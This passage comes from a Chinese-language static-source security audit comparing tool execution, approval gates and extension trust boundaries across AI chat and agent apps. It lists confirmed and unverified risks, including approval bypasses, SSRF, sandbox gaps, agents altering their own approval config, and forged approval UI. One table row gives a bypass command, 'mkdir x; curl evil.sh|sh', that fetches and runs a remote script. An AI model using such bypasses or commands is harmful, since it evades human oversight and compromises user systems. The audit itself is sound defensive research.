一个能力出现在某处工具清单里，不等于本端模型能发现和调用它。**AIO Hub 的 `internal_request_file` 是这条审计项的正例**：它只声明在 `BUILTIN_VCP_TOOLS`（AIO 作为分布式节点注册时上报的 manifest）中，不进 `toolRegistryManager`，因此 AIO 内的模型既看不到也调不动它；VCPToolBox 侧收到 `register_tools` 后又把它从 `externalTools` 里显式过滤掉，远端模型的工具列表里同样没有它。它纯粹是为满足 VCP 分布式契约而实现的**入向**协议义务。

它的实际触发方也不是"模型调用某个工具"，而是 VCPToolBox 的透明文件拉取：当某个**非分布式**插件的参数里出现 `file://` 字符串时，`Plugin.js:947-977` 会拦截并调用 `FileFetcherServer.resolveFileUrl`，后者按 `findServerByIp(requestIp)` 定位到发起方节点，再向该节点发出 `internal_request_file` 请求（`FileFetcherServer.js:118`）。所以模型对它只有**间接影响**：在别的工具参数里写一个 `file://` 路径，读取范围则被限定在发起该次调用的那个节点上。

`internal_request_file` 跳过的是节点侧的暴露名单校验（`vcpNodeProtocol.ts` 的 294 行早退，绕过 341-380 行的清单检查）；分布式入向调用本身没有逐次人工审批门。它不再是无限制读取：`parseLocalFileUrl()` 只接受格式正确的 `file://` URL（拒绝凭据/端口/查询/片段，拒绝 UNC 与远程主机路径），读取改走 aio-file-operator 的 Rust 加固命令（`inspectFileForExternalTransfer`/`readFileForExternalTransfer`）——白名单内直读、审批区需用户审批、Rust 侧复校验沙箱/规则/文件大小、60 秒速率窗口与审计日志，沙箱外目录会被 Rust 侧拦截。VCPChat 侧同一机制同样成立（`VCPDistributedServer.js:599-640`），这是协议要求两端实现的能力。

审计任何分布式/多端协议实现时都要分开问三件事：本端模型能否发现它、本端模型能否调用它、谁才是真正的触发方。三者混淆会把协议义务误判成提权路径，也会反过来漏掉真正的入向风险。

## 已确认的高风险项汇总

按"已在源码中确认"与"需进一步验证"分列。详细前提与可利用性见各单项目笔记的安全审计节。

### 已确认

| 项目 | 项 | 性质 |
| --- | --- | --- |
| AIO Hub | `data-filter` 的 `customScript` 进 `new Function()`（渲染进程主上下文执行），但 Agent 路径已禁止 custom 操作符/customScript，仅用户手动 UI 路径保留 | 文本协议直达代码执行（Agent 面已收窄） |
| AIO Hub | 入向 `internal_request_file` 已接入 aio-file-operator 沙箱/审批区与 Rust 侧复校验（白名单直读、审批区需审批、60 秒速率窗口、审计日志），不再可无限制读取任意 `file://` 路径；暴露名单校验仍被跳过（见审计项 ⑧） | 数据外泄（面收窄） |
| AIO Hub | 前端沙箱已加固（真实路径解析 + `isPathWithinRoot`），但普通 force 命令 Rust 侧仍无路径限制，`checkSecurityPolicy` 仍只读 `args.path`（多路径方法缺口），未复用该校验的工具仍无沙箱 | 沙箱覆盖不均 |
| AIO Hub | Agent 可用 `set_agent_field` 改自己的 `toolCallConfig`（字段黑名单未覆盖） | 审批绕过链 |
| Chatbox | Windows 上 `code_execution` 无 OS 隔离，裸执行 | 平台差异 |
| Chatbox | Skill 自安装链：`code_execution` 生成 SKILL.md → `install_skill`（不审查正文、自动启用），配合 `agentFullAccess` 无人工确认 | 提权链 |
| Cherry Studio | `acceptEdits` 白名单只检测命令首词，`mkdir x; curl evil.sh\|sh` 可绕过 | 审批绕过 |
| Cherry Studio | 路径越权检查不解析 Bash 命令文本中的路径（代码注释承认刻意为之） | 检查覆盖不全 |
| Cherry Studio | `browser` in-memory MCP 用全局共享 `persist:default` Cookie 分区，`execute` 可执行任意 JS，默认无头 | 会话串联 + 不可见执行 |
| Hermes | `execute_code` 沙箱 RPC 旁路：`_rpc_server_loop` 在父进程线程回调 `handle_function_call`，工具侧不重复走编排层审批门（仅受 allow-list 限制） | 审批绕过旁路 |
| Hermes | `HERMES_YOLO_MODE` 冻结或会话 yolo 开启时跳过全部危险命令审批门（显式降级，非默认） | 审批绕过（显式） |
| LobeHub | MCP HTTP client（服务端与桌面端）直连用户配置 URL，无 SSRF 过滤，bearer token 随请求头泄露 | SSRF |
| LobeHub | 多个高危工具零审批声明（`lobe-creds` 的 `saveCreds`/`injectCredsToSandbox`、`lobe-browser` 全部 API、`lobe-message` 管理类、`lobe-remote-device`、`callSubAgent`） | 默认放行 |
| LobeHub | 子 agent 以 `headless` 运行，跳过审批门 | 审批绕过 |
| LobeHub | 通用安全黑名单只匹配 `command`/`path` 两个参数名，`lobe-browser` 的 `navigate`/`click`/`fill` 参数不在覆盖内 | 兜底缺口 |
| OpenCode | shell 为普通子进程（无 pty、无沙箱），隔离仅靠权限审批 + 工作区外目录检查 + 2 分钟默认超时 | 执行域无 OS 级隔离 |
| OpenCode | `ask` 审批阻塞在无超时的 Deferred 上，UI 不响应则调用永久挂起 | 可用性（不越权） |
| Pi | 无审批层，`beforeToolCall` 钩子是唯一拦截点且由扩展实现；执行端不二次鉴权，扩展未注册钩子时任何工具直接执行 | 默认放行 |
| Pi | `!` 前缀 bash 直通（用户主动输入）绕过模型工具协议与钩子 | 用户手动旁路，非模型触发 |
| VCPChat | 自带分布式节点默认启用，在本机执行 PowerShellExecutor、PTYShellExecutor、FileOperator、ScreenPilot 等 | 本机高危执行 |
| VCPChat | 自动允许规则纯字符串/正则匹配无风险分级，空 pattern 或 `.*` 可让全部工具免审批 | 审批绕过 |
| VCPChat | `DESKTOP_PUSH` 完全绕开审批协议，模型输出标记即在桌面画布执行 HTML+JS | 旁路能力 |
| VCPChat | `/admin_api` Basic Auth 凭据明文落盘，且可改写服务端 Agent Assistant / Task Assistant 配置（系统提示词、定时任务） | 持久化提权 |
| VCPToolBox | 审批响应无身份校验，requestId 随广播暴露给所有 `VCPLog` 客户端 | 审批伪造 |
| VCPToolBox | `/plugin-callback/:pluginName/:taskId` 无鉴权，可伪造异步任务结果注入下一轮上下文 | 结果伪造 |
| VCPToolBox | 解析器不保护 Markdown code fence，`fuzzyToolMatching` 进一步放宽协议 | 误触发面 |
| VCPToolBox | `PowerShellExecutor` 仅关键字黑名单，拼接后 `Invoke-Expression` | 命令注入面 |
| SillyTavern | `/tools-register` 对 action closure 无来源限制，角色卡/世界书/Quick Reply 可定义任意工具 | 内容驱动的供应链 |
| SillyTavern | 扩展 action 在浏览器主上下文以当前用户身份执行，可访问 `getContext()` 全部内部 API 与任意 `fetch`，核心不提供降权手段 | 同权执行 |
| SillyTavern | 第三方扩展安装的信任警告可被"不再提醒"永久关闭；`extensions.autoUpdate` 默认开启，无 commit 签名或 pin 校验 | git 供应链 |
| SillyTavern | `enableServerPluginsAutoUpdate` 默认开启（仅对已启用插件生效），上游任意 push 会被自动 `git pull` 并在重启后执行 | 持续供应链暴露 |
| 全部 | 无工具结果输出侧过滤层 | prompt 注入放大 |

### 需进一步验证

- Chatbox：`user_exec` 白名单的反引号/`$()` 检测基于 bash 语义，未覆盖 PowerShell 调用运算符 `&`——理论绕过面，未构造 PoC。
- Cherry Studio：子 agent 是否共享父会话权限策略快照（依赖 SDK 内部实现）；Pyodide Web Worker 能否桥接回主进程；`skillService.install()` 的下载内容校验。
- Hermes：子代理执行阶段 `enabled_tools` 是否在 `dispatch` 时逐次复验（静态代码显示过滤仅发生在 `get_tool_definitions`）；`_should_skip_container_guards` 与 `has_host_access`（docker bind-mount host 路径）的运行时关系；`.env` 凭据类工具的审批覆盖。
- LobeHub：MCP SDK 的 `StreamableHTTPClientTransport` 自身是否有内建 SSRF 过滤；云沙箱网络隔离范围。
- VCPToolBox：`PowerShellExecutor` 黑名单的具体绕过 payload；SSRF 防护；`LinuxShellExecutor` 八层校验的逐层绕过面；Docker 沙箱后端实际可用性；其余 50 余个插件未逐一审查。
- Pi：bash 工具的路径/命令约束与 `prepareArguments` shim 的组合边界未逐一覆盖；容器化隔离模式（Gondolin/Docker/OpenShell）是文档承诺，未在仓库代码内验证；真实终端下 bash 输出流式与图片回注行为未实测。
- OpenCode：code-mode 沙箱解释器（`@opencode-ai/codemode`）的隔离强度未验证；AI SDK 内部工具并行度与 `experimental_repairToolCall` 的实际行为未实测；`tools/list_changed` 重拉与 MCP 服务器热重连未实测。
- VCPChat：三个 preload 文件暴露 `loadForumConfig` 的窗口级差异是否构成完整 XSS → 凭据泄漏链路；VCPLog 默认是否走 `wss://`。
- SillyTavern：`isValidUrl` 只判断 `new URL()` 是否抛错、不校验主机名，结合默认 `privateAddressWhitelist.enabled: false`，服务端 `git clone` 可能构成 SSRF——未验证 `simple-git` 是否复用了受白名单保护的 fetch 封装；角色卡导入流程是否会自动启用卡内嵌的 Quick Reply/世界书；多用户模式下扩展与 QR 预设的跨账号隔离粒度。
- AIO Hub：VCP Proxy 方法级禁用粒度；插件安装信任流程；VCPToolBox 侧 `execute_tool` 发起方鉴权模型——这条决定入向 `internal_request_file` 的实际门槛（谁能让主服务器对某个已注册节点发起拉取），而 VCPToolBox 侧已确认审批响应无身份校验，两者拼合后风险更实。另需验证 `resolveFileUrl` 的 `requestIp` 归属判定能否被伪造，那是这条链路的真实入口。

所有结论均为静态源码阅读，未做运行时验证；多数仓库未安装依赖。

## 扩展形态对照

| 项目 | 扩展入口 | 信任边界落在哪 |
| --- | --- | --- |
| AIO Hub | 能力轴：ToolRegistry/Factory、AgentExtension、JS/Sidecar/Native 插件、skills、VCP proxy；协议轴：ToolCallingProtocol | 能力统一汇入 registry，以 `agentCallable` 与审批配置收口；协议层当前硬编码注册 VCP，新增协议仍需改源码 |
| AstrBot | 内置装饰器、插件 handler、MCP、Handoff、computer tools | 四路统一成 FunctionTool；非内置权限默认 member，内置自行检查 |
| Chatbox | MCP（stdio/HTTP/SSE）、Skills | 用户配置的 MCP server 是宿主子进程；skill 安装只校验路径与格式，不审查正文 |
| Cherry Studio | 用户配置 MCP、in-memory MCP、Skills 市场 | 注册表的 `exposure` 与禁用/自动批准策略，而非"外部 MCP 连上即获权限" |
| DeepChat | AgentToolManager、MCP、Skills、subagent capability、ACP backend | session profile/binding hash 收口；ACP 会话由外部 backend 自负工具边界 |
| Hermes Agent | `plugins/` 目录、MCP server 配置、`skills/`+`optional-skills/`（`hermes skills install`）、`toolsets.py` 平台装配 | 插件可注册/覆盖工具（`override=True` 需信任门）、钩子；MCP 动态 nuke-and-repave 且带 include/exclude 过滤；技能是指令文本非权限沙箱；子代理默认 auto-deny |
| Jan | MCP server、RAG extension、Web 搜索 provider | MCP 经 Rust/Tauri 执行并受四级批准；路由冻结在缓存稳定性与即时变化之间取舍 |
| LobeHub | connector/MCP（stdio/HTTP/cloud）、market/discover gateway、Composio | connector 逐工具权限；OAuth/bearer 经 AES-GCM 加密存储；stdio 无进程沙箱；Composio 在工作区场景可代表 owner 账号调用 |
| Manifold Desktop | MCP stdio/SSE、PluginContext `RegisterTool` 骨架 | MCP 只到展示；插件 Initialize 未调用，二者都未形成可执行扩展闭环 |
| NextChat | OpenAPI 插件、MCP stdio | 插件与 MCP 分属原生/文本两条链；配置即高信任边界，无统一审批 |
| Open WebUI | DB Python 工具、MCP/OpenAPI server、Function/Filter、远程 Pipeline、子代理 | AccessGrants、连接授权与 Valves；Python 插件/远端 server 具有各自执行权限 |
| OpenCode | 自定义 `{tool,tools}/*.js\|ts`、插件 `tool` hook（含 `tool.definition`/`tool.execute.before/after` 事件）、MCP（stdio/StreamableHTTP/SSE + OAuth）、Skill（SKILL.md + `skill` 工具）、code-mode 子工具 | 权限规则按工具名 + pattern 分级（allow/ask/deny），MCP 工具调用前全名审批；Skill 与 MCP 工具按同一 permission 过滤；子 agent（TaskTool）权限收窄 + 深度限制，非旁路 |
| Pi | 扩展 `registerTool`、`registerCommand`、MarkdownTransformer、自定义消息/条目渲染器；skills 为文本资源 | 扩展代码与宿主同权（本地进程）；项目信任门约束 `.pi` 资源加载；无 MCP、无内容侧工具定义入口 |
| Risuai | 模块 mcp.url 声明（远程 MCP、stdio、内置 internal、插件 plugin）、插件 v3 API registerMCP、Responses web_search_preview 开关 | 插件 iframe 沙箱（CSP + postMessage RPC + API 白名单，v3 不静态扫描、纯靠沙箱）；stdio 仅桌面；审批只覆盖 internal:risuai 写/删工具；远程 MCP 无 SSRF 过滤 |
| SillyTavern | 浏览器扩展、服务端 plugin、**`/tools-register` 的 STscript closure** | 安装信任，且被内容路径削弱：第三方 Git 仅允许 HTTP(S)、首装有警告（可永久关闭）、目录名净化；plugin 走本地 ES module `import()`；但工具定义还能由角色卡/世界书/QR 提供，不经过任何安装动作 |
| VCPChat | 自带节点的 `Plugin/*` 目录 | 无——自带节点不隔离自己的插件 |
| VCPToolBox | plugin manifest、分布式节点 | 插件宿主自身权限 + 审批规则；节点只有一层全局 `VCP_Key` |

一条容易混淆的区分：**MCP、Skill、Plugin 三者的权限模型完全不同。** MCP 通常连接进程或远端服务；Skill 通常是模型可读的指令/流程文本，本身不带权限；Plugin 往往是与宿主同权的可执行代码。Chatbox 的 skill 安装校验不替代 `user_exec` 审批；SillyTavern 的 Git 安装警告不替代 extension action 的权限隔离；VCPToolBox 的 `requiresAdmin` 声明不替代插件内部的实际比对。工具界面应当说明执行位置与权限，而不仅是工具名。

## 与消息渲染器调查的关系

[消息渲染器横向对比](../消息渲染器/消息渲染器横向对比.md)及各项目渲染笔记回答的是"工具结果如何显示、流式如何持久化"，与本文的执行与权限结论不重叠，但有一处交叉值得记：**审批 UI 是否可被模型输出伪造。**

LobeHub 侧已确认不可伪造——审批卡片渲染依赖只能由服务端 `humanApprove` 写入的数据库字段，Markdown 里的 `<tool>` 标签是纯装饰、点击不触发审批 action。但视觉钓鱼仍然可行：模型可以在正文里模仿"工具已获批准，执行中"之类措辞误导用户，代码层未发现专门的视觉区分防护。

反例是 VCPChat：审批请求来自 WebSocket 消息且无消息级鉴权，能在该连接上注入消息即能伪造审批 UI；`DESKTOP_PUSH` 更是让模型的普通输出直接变成可执行内容。这两者说明"审批 UI 的可信度"取决于驱动它的数据来源是否权威，而非 UI 本身的实现。

各项目渲染笔记：
[AIO Hub](../消息渲染器/AIO-Hub-消息渲染器调查笔记.md)、[AstrBot](../消息渲染器/AstrBot-消息渲染器调查笔记.md)、[Chatbox](../消息渲染器/Chatbox-消息渲染调查笔记.md)、[Cherry Studio](../消息渲染器/Cherry-Studio-消息渲染调查笔记.md)、[DeepChat](../消息渲染器/DeepChat-消息渲染器调查笔记.md)、[Hermes Agent](../消息渲染器/Hermes-Agent-消息渲染器调查笔记.md)、[Jan](../消息渲染器/Jan-消息渲染器调查笔记.md)、[LobeHub](../消息渲染器/LobeHub-消息渲染调查笔记.md)、[Manifold Desktop](../消息渲染器/Manifold-Desktop-消息渲染调查笔记.md)、[NextChat](../消息渲染器/NextChat-消息渲染器调查笔记.md)、[Open WebUI](../消息渲染器/Open-WebUI-消息渲染器调查笔记.md)、[OpenCode](../消息渲染器/OpenCode-消息渲染调查笔记.md)、[Pi](../消息渲染器/Pi-消息渲染器调查笔记.md)、[SillyTavern](../消息渲染器/SillyTavern-消息渲染调查笔记.md)、[VCPChat](../消息渲染器/VCPChat-消息渲染器调查笔记.md)
